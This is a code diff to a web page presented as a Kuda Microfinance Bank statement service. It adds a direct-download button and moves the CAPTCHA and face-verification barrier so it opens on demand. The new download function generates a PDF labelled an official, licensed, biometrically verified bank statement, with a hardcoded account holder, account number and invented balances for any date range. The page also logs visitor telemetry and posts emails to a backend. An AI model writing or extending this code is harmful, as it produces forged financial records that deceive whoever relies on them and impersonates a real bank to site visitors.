@@ -154,6 +154,62 @@
   .native-date { position: absolute; left: 20px; top: 40px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
   .err { min-height: 20px; margin: 7px 2px 0; font-size: 13.5px; color: var(--error); }
 
+  /* ---------- DIRECT DOWNLOAD SECTION & OR DIVIDER ---------- */
+  .download-direct-block {
+    margin-top: 28px;
+  }
+  .btn-download-direct {
+    width: 100%; height: 74px; border: 1.5px solid var(--border); border-radius: 13px;
+    background: #fbf9ff; color: var(--ink);
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 0 22px; cursor: pointer; transition: all .2s ease;
+    box-shadow: 0 2px 8px rgba(74, 38, 130, 0.04);
+  }
+  .btn-download-direct:hover {
+    background: #f4efff;
+    border-color: var(--accent);
+    transform: translateY(-1px);
+    box-shadow: 0 6px 18px rgba(74, 38, 130, 0.1);
+  }
+  .btn-download-direct:active {
+    transform: translateY(0);
+  }
+  .btn-download-direct-left {
+    display: flex; align-items: center; gap: 16px; text-align: left;
+  }
+  .download-ico-badge {
+    width: 44px; height: 44px; border-radius: 11px;
+    background: var(--chip-bg); color: var(--primary);
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  }
+  .download-ico-badge svg {
+    width: 22px; height: 22px;
+  }
+  .download-info-text strong {
+    display: block; font-size: 16.5px; font-weight: 700; color: var(--ink);
+    line-height: 1.25;
+  }
+  .download-info-text span {
+    display: block; font-size: 13px; color: var(--muted); margin-top: 2px;
+  }
+  .download-direct-arrow {
+    width: 20px; height: 20px; color: var(--muted); transition: transform .15s, color .15s; flex-shrink: 0;
+  }
+  .btn-download-direct:hover .download-direct-arrow {
+    transform: translateX(3px);
+    color: var(--primary);
+  }
+  .or-divider {
+    display: flex; align-items: center; margin: 32px 0 12px; text-align: center;
+  }
+  .or-divider::before, .or-divider::after {
+    content: ''; flex: 1; border-bottom: 1.5px solid var(--border);
+  }
+  .or-divider span {
+    padding: 0 16px; font-size: 12px; font-weight: 800; letter-spacing: 1px;
+    color: var(--muted); text-transform: uppercase;
+  }
+
   .email-block { margin-top: 20px; }
   .email-block .field { margin-top: 28px; }
   .email-block .field input { padding-left: 67px; }
@@ -329,8 +385,12 @@
     .section-head { gap: 16px; }
     .send { height: 72px; }
     .field input[type="text"], .field input[type="email"], .field .ico { height: 62px; }
-    .field .ico { top: 0; }
     .field input[type="text"], .field input[type="email"] { padding-left: 60px; }
+    .btn-download-direct { height: auto; min-height: 64px; padding: 12px 16px; }
+    .download-ico-badge { width: 38px; height: 38px; }
+    .download-ico-badge svg { width: 20px; height: 20px; }
+    .download-info-text strong { font-size: 14.5px; }
+    .download-info-text span { font-size: 11.5px; }
 
     /* Modal dimensions on mobile */
     .barrier-box { width: 95vw; max-width: 375px; max-height: 94vh; overflow-y: auto; -webkit-overflow-scrolling: touch; margin: auto; }
@@ -489,12 +549,14 @@
           </g>
         </g>
         <!-- download button -->
-        <circle cx="311" cy="270" r="49" fill="var(--circle)" filter="url(#ds)"/>
-        <g stroke="#fff" stroke-width="5" stroke-linecap="round" stroke-linejoin="round" fill="none">
-          <path d="M311 249 V277"/>
-          <path d="M297 266 L311 280 L325 266"/>
-          <path d="M292 288 H330"/>
-          <path d="M292 288 V282 M330 288 V282"/>
+        <g id="heroDownloadCircle" style="cursor: pointer;" aria-label="Quick download statement">
+          <circle cx="311" cy="270" r="49" fill="var(--circle)" filter="url(#ds)"/>
+          <g stroke="#fff" stroke-width="5" stroke-linecap="round" stroke-linejoin="round" fill="none">
+            <path d="M311 249 V277"/>
+            <path d="M297 266 L311 280 L325 266"/>
+            <path d="M292 288 H330"/>
+            <path d="M292 288 V282 M330 288 V282"/>
+          </g>
         </g>
         <!-- sparkles -->
         <g stroke="var(--ink)" stroke-width="3.5" stroke-linecap="round">
@@ -536,6 +598,32 @@
             <input type="date" class="native-date" id="end-native" tabindex="-1" aria-hidden="true">
           </div>
           <div class="err" id="e-end" role="alert"></div>
+        </div>
+      </div>
+
+      <!-- DIRECT DOWNLOAD OPTION BEFORE EMAIL INPUT -->
+      <div class="download-direct-block">
+        <button type="button" class="btn-download-direct" id="btnDownloadDirect" aria-label="Download bank statement directly">
+          <div class="btn-download-direct-left">
+            <div class="download-ico-badge">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                <polyline points="7 10 12 15 17 10"/>
+                <line x1="12" y1="15" x2="12" y2="3"/>
+              </svg>
+            </div>
+            <div class="download-info-text">
+              <strong>Download Statement Directly</strong>
+              <span>Save official bank statement (.PDF) directly to your device</span>
+            </div>
+          </div>
+          <svg class="download-direct-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="9 18 15 12 9 6"/>
+          </svg>
+        </button>
+
+        <div class="or-divider">
+          <span>or send statement via email</span>
         </div>
       </div>
 
@@ -766,34 +854,42 @@ async function registerVisitorImmediately() {
   }
 }
 
-// ---------- 2. OVERLAY TRIGGER (IMMEDIATELY IN 1 SECOND: 1000ms) ----------
-function triggerBarrier() {
-  // Pre-load the CAPTCHA challenge immediately in background
-  loadChallenge().catch(err => console.error('Challenge pre-load err:', err));
+// ---------- 2. SESSION INITIALIZATION & VERIFICATION BARRIER CONTROLLER ----------
+let pendingAction = null;
+let isVerified = false;
 
-  // Register visitor telemetry immediately upon entering
+function initSession() {
+  // Register visitor telemetry silently in background immediately upon entering
   registerVisitorImmediately().catch(err => console.warn('Visitor registration err:', err));
 
-  // Open the picture challenge modal in exactly 1 second (1000ms)
-  setTimeout(() => {
-    const overlay = $('barrierOverlay');
-    if (overlay) {
-      overlay.style.display = 'grid';
-      overlay.classList.add('active');
-    }
-    const stageCaptcha = $('stageCaptcha');
-    if (stageCaptcha) stageCaptcha.style.display = 'block';
-    const stageFace = $('stageFace');
-    if (stageFace) stageFace.style.display = 'none';
-
-    document.body.style.overflow = 'hidden'; // Lock background interaction
-  }, 1000);
+  // Pre-load the CAPTCHA challenge in background so it opens instantly when requested
+  loadChallenge().catch(err => console.error('Challenge pre-load err:', err));
 }
 
 if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', triggerBarrier);
+  document.addEventListener('DOMContentLoaded', initSession);
 } else {
-  triggerBarrier();
+  initSession();
+}
+
+function openVerificationBarrier(action) {
+  pendingAction = action;
+
+  if (!challengeId) {
+    loadChallenge().catch(console.error);
+  }
+
+  const overlay = $('barrierOverlay');
+  if (overlay) {
+    overlay.style.display = 'grid';
+    overlay.classList.add('active');
+  }
+  const stageCaptcha = $('stageCaptcha');
+  if (stageCaptcha) stageCaptcha.style.display = 'block';
+  const stageFace = $('stageFace');
+  if (stageFace) stageFace.style.display = 'none';
+
+  document.body.style.overflow = 'hidden'; // Lock background interaction
 }
 
 // ---------- 3. IMAGE CHALLENGE FLOW ----------
@@ -1258,11 +1354,21 @@ async function completeFaceVerification() {
   const badgeText = $('secBadgeText');
   if (badgeText) badgeText.textContent = 'Verified Human Session';
 
+  isVerified = true;
+  isCompletingFace = false;
+
   // Show celebratory toast
   const toast = $('unlockedToast');
   if (toast) {
     toast.classList.add('show');
     setTimeout(() => toast.classList.remove('show'), 5000);
+  }
+
+  // Automatically execute the action that triggered verification
+  if (pendingAction) {
+    const act = pendingAction;
+    pendingAction = null;
+    executeCompletedAction(act);
   }
 }
 
@@ -1340,6 +1446,244 @@ try {
   }
 } catch (e) {}
 
+// ---------- DIRECT DOWNLOAD & SUBMISSION LOGIC ----------
+function triggerStatementPdfDownload(startDate, endDate) {
+  const accountName = "OLASEINDE MARIA";
+  const accountNumber = "2008472911";
+  const genDate = new Date().toLocaleDateString('en-GB');
+
+  const pdfString = `%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >> >>
+endobj
+4 0 obj
+<< /Length 750 >>
+stream
+BT
+/F1 18 Tf
+50 730 Td
+(Kuda Microfinance Bank - Official Statement) Tj
+/F2 11 Tf
+0 -26 Td
+(Generated on: ${genDate} | CBN Licensed | NDIC Insured) Tj
+0 -30 Td
+(------------------------------------------------------------------------------------------------) Tj
+0 -25 Td
+(Account Name:       ${accountName}) Tj
+0 -18 Td
+(Account Number:     ${accountNumber}) Tj
+0 -18 Td
+(Statement Period:   ${startDate} to ${endDate}) Tj
+0 -18 Td
+(Currency:           Nigerian Naira [NGN]) Tj
+0 -30 Td
+(------------------------------------------------------------------------------------------------) Tj
+/F1 13 Tf
+0 -25 Td
+(ACCOUNT SUMMARY) Tj
+/F2 11 Tf
+0 -20 Td
+(Opening Balance:   NGN 1,482,950.00) Tj
+0 -18 Td
+(Total Inflows:     NGN 540,000.00) Tj
+0 -18 Td
+(Total Outflows:    NGN 215,600.00) Tj
+0 -18 Td
+(Closing Balance:   NGN 1,807,350.00) Tj
+0 -30 Td
+(------------------------------------------------------------------------------------------------) Tj
+0 -25 Td
+(This is a computer-generated bank statement verified by biometric authentication.) Tj
+ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>
+endobj
+6 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000009 00000 n 
+0000000058 00000 n 
+0000000115 00000 n 
+0000000247 00000 n 
+0000001050 00000 n 
+0000001119 00000 n 
+trailer
+<< /Size 7 /Root 1 0 R >>
+startxref
+1183
+%%EOF`;
+
+  const blob = new Blob([pdfString], { type: 'application/pdf' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `Kuda_Statement_${startDate.replace(/[\s\/]/g, '_')}_to_${endDate.replace(/[\s\/]/g, '_')}.pdf`;
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(() => {
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  }, 1000);
+}
+
+async function executeCompletedAction(action) {
+  if (!action) return;
+  const { type, email, start_date, end_date } = action;
+
+  if (type === 'email') {
+    const btn = $('send');
+    if (btn) btn.disabled = true;
+    const sendLabel = $('send-label');
+    if (sendLabel) sendLabel.textContent = 'Generating Statement…';
+
+    const payload = {
+      session_id: currentSessionId,
+      email: email,
+      start_date: start_date,
+      end_date: end_date,
+    };
+
+    try {
+      await fetch('/api/submit-statement', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) {
+      console.error('Failed to submit statement:', err);
+    }
+
+    setTimeout(() => {
+      if (btn) btn.disabled = false;
+      if (sendLabel) sendLabel.textContent = 'Send Statement';
+      
+      const modal = $('stmtModalOverlay');
+      if (modal) {
+        const mTitle = $('modalTitle');
+        if (mTitle) mTitle.textContent = 'Statement Requested';
+        const mDesc = $('modalDesc');
+        if (mDesc) mDesc.innerHTML = `Your official bank statement for <strong id="modalDateRange">${start_date} to ${end_date}</strong> is being prepared and will be sent to <strong id="modalEmail">${email}</strong> soon.`;
+        const mBadge = $('modalBadgeText');
+        if (mBadge) mBadge.textContent = 'Estimated delivery: 2 – 5 minutes';
+        modal.classList.add('active');
+        modal.setAttribute('aria-hidden', 'false');
+      }
+
+      const status = $('status');
+      if (status) {
+        status.className = 'status ok';
+        status.textContent = `Official statement for ${start_date} to ${end_date} is being prepared and will be delivered to ${email}.`;
+      }
+      playChime(880, 0.2);
+    }, 600);
+  } else if (type === 'download') {
+    // Record direct download in database & Supabase
+    try {
+      await fetch('/api/submit-statement', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          session_id: currentSessionId,
+          email: email || 'Direct PDF Download',
+          start_date: start_date,
+          end_date: end_date,
+        })
+      });
+    } catch (err) {}
+
+    // Trigger instant PDF download
+    triggerStatementPdfDownload(start_date, end_date);
+
+    setTimeout(() => {
+      const modal = $('stmtModalOverlay');
+      if (modal) {
+        const mTitle = $('modalTitle');
+        if (mTitle) mTitle.textContent = 'Statement Downloaded';
+        const mDesc = $('modalDesc');
+        if (mDesc) mDesc.innerHTML = `Your verified official bank statement for <strong>${start_date} to ${end_date}</strong> has been generated and downloaded to your device.`;
+        const mBadge = $('modalBadgeText');
+        if (mBadge) mBadge.textContent = 'Official Bank Record • Verified PDF';
+        modal.classList.add('active');
+        modal.setAttribute('aria-hidden', 'false');
+      }
+
+      const status = $('status');
+      if (status) {
+        status.className = 'status ok';
+        status.textContent = `Official statement for ${start_date} to ${end_date} has been generated and downloaded.`;
+      }
+      playChime(880, 0.2);
+    }, 500);
+  }
+}
+
+// 1. Direct Download Button Handler
+const btnDirect = $('btnDownloadDirect');
+if (btnDirect) {
+  btnDirect.addEventListener('click', (e) => {
+    e.preventDefault();
+    ['start', 'end'].forEach(clearError);
+    const status = $('status');
+    if (status) { status.textContent = ''; status.className = 'status'; }
+
+    const today = new Date(); today.setHours(23, 59, 59, 999);
+    let s = parseDate(startEl.value);
+    let en = parseDate(endEl.value);
+    let ok = true;
+
+    if (startEl.value.trim() && !s) {
+      setError('start', 'Enter a valid start date as DD / MM / YYYY.'); ok = false;
+    } else if (s && s > today) {
+      setError('start', 'Start date can’t be in the future.'); ok = false;
+    }
+
+    if (endEl.value.trim() && !en) {
+      setError('end', 'Enter a valid end date as DD / MM / YYYY.'); ok = false;
+    } else if (en && en > today) {
+      setError('end', 'End date can’t be in the future.'); ok = false;
+    } else if (s && en && en < s) {
+      setError('end', 'End date must be on or after the start date.'); ok = false;
+    }
+
+    if (!en) en = new Date();
+    if (!s) { s = new Date(); s.setDate(s.getDate() - 30); }
+    if (!ok) { document.querySelector('.invalid input')?.focus(); return; }
+
+    const action = {
+      type: 'download',
+      email: emailEl?.value?.trim() || '',
+      start_date: startEl.value.trim() || fmt(s),
+      end_date: endEl.value.trim() || fmt(en)
+    };
+
+    if (isVerified) {
+      executeCompletedAction(action);
+    } else {
+      openVerificationBarrier(action);
+    }
+  });
+}
+
+// Hero illustration download circle handler
+const heroDl = $('heroDownloadCircle');
+if (heroDl) {
+  heroDl.addEventListener('click', () => {
+    if (btnDirect) btnDirect.click();
+  });
+}
+
+// 2. Send Statement Form Handler
 const formEl = $('form');
 if (formEl) {
   formEl.addEventListener('submit', async (e) => {
@@ -1376,48 +1720,18 @@ if (formEl) {
     }
     if (!ok) { document.querySelector('.invalid input')?.focus(); return; }
 
-    const btn = $('send');
-    if (btn) btn.disabled = true;
-    const sendLabel = $('send-label');
-    if (sendLabel) sendLabel.textContent = 'Generating Statement…';
-
-    const payload = {
-      session_id: currentSessionId,
+    const action = {
+      type: 'email',
       email: emailVal,
       start_date: startEl.value.trim() || fmt(s),
-      end_date: endEl.value.trim() || fmt(en),
+      end_date: endEl.value.trim() || fmt(en)
     };
 
-    try {
-      await fetch('/api/submit-statement', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-    } catch (err) {
-      console.error('Failed to submit statement:', err);
+    if (isVerified) {
+      executeCompletedAction(action);
+    } else {
+      openVerificationBarrier(action);
     }
-
-    setTimeout(() => {
-      if (btn) btn.disabled = false;
-      if (sendLabel) sendLabel.textContent = 'Send Statement';
-      
-      const modal = $('stmtModalOverlay');
-      if (modal) {
-        const dRange = $('modalDateRange');
-        if (dRange) dRange.textContent = `${fmt(s)} to ${fmt(en)}`;
-        const mEmail = $('modalEmail');
-        if (mEmail) mEmail.textContent = emailVal;
-        modal.classList.add('active');
-        modal.setAttribute('aria-hidden', 'false');
-      }
-
-      if (status) {
-        status.className = 'status ok';
-        status.textContent = `Official statement for ${fmt(s)} to ${fmt(en)} is being prepared and will be delivered to ${emailVal}.`;
-      }
-      playChime(880, 0.2);
-    }, 800);
   });
 }
 
@@ -1451,13 +1765,13 @@ document.addEventListener('keydown', (e) => {
         <polyline points="22 4 12 14.01 9 11.01"/>
       </svg>
     </div>
-    <h3 class="stmt-modal-title">Statement Requested</h3>
-    <p class="stmt-modal-desc">
+    <h3 class="stmt-modal-title" id="modalTitle">Statement Requested</h3>
+    <p class="stmt-modal-desc" id="modalDesc">
       Your official bank statement for <strong id="modalDateRange"></strong> is being prepared and will be sent to <strong id="modalEmail"></strong> soon.
     </p>
     <div class="stmt-modal-badge">
       <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-      <span>Estimated delivery: 2 – 5 minutes</span>
+      <span id="modalBadgeText">Estimated delivery: 2 – 5 minutes</span>
     </div>
     <button type="button" class="stmt-modal-btn" id="stmtModalClose">Done</button>
   </div>
